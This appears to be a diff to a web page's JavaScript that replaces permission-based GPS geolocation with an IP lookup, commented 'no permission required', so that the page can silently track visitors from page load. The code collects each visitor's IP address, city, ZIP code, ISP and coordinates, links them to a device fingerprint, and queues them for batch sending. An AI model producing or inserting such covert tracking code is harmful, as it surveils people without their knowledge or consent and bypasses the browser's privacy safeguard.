@@ -658,9 +658,11 @@
         }
 
         function trackLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
+            // Use IP-based geolocation (no permission required)
+            fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
                         locationCount++;
                         lastUpdate = new Date().toLocaleTimeString();
                         
@@ -702,16 +704,27 @@
                             timezone: fingerprint.timezone,
                             timezoneOffset: fingerprint.timezoneOffset,
                             
-                            // GPS Location data
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            altitudeAccuracy: position.coords.altitudeAccuracy,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed,
-                            timestamp: position.timestamp,
-                            collectedAt: new Date().toISOString()
+                            // IP-based Location data
+                            latitude: data.lat,
+                            longitude: data.lon,
+                            accuracy: 'IP-based (approximate)',
+                            altitude: 'N/A',
+                            altitudeAccuracy: 'N/A',
+                            heading: 'N/A',
+                            speed: 'N/A',
+                            timestamp: Date.now(),
+                            collectedAt: new Date().toISOString(),
+                            
+                            // IP geolocation details
+                            ipAddress: data.query,
+                            country: data.country,
+                            countryCode: data.countryCode,
+                            region: data.regionName,
+                            city: data.city,
+                            zip: data.zip,
+                            isp: data.isp,
+                            organization: data.org,
+                            locationMethod: 'IP-based'
                         };
                         
                         // Add to queue for batch sending
@@ -737,18 +750,12 @@
                         
                         localStorage.setItem('contract_locations', JSON.stringify(locations));
                         
-                        console.log(`[${deviceName}] #${locationCount}: ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`);
-                    },
-                    (error) => {
-                        console.warn('Location error:', error.code);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
+                        console.log(`[${deviceName}] #${locationCount}: ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)} (${locationData.city}, ${locationData.country})`);
                     }
-                );
-            }
+                })
+                .catch((error) => {
+                    console.warn('IP location error:', error.message);
+                });
         }
 
         // Start silent tracking on page load
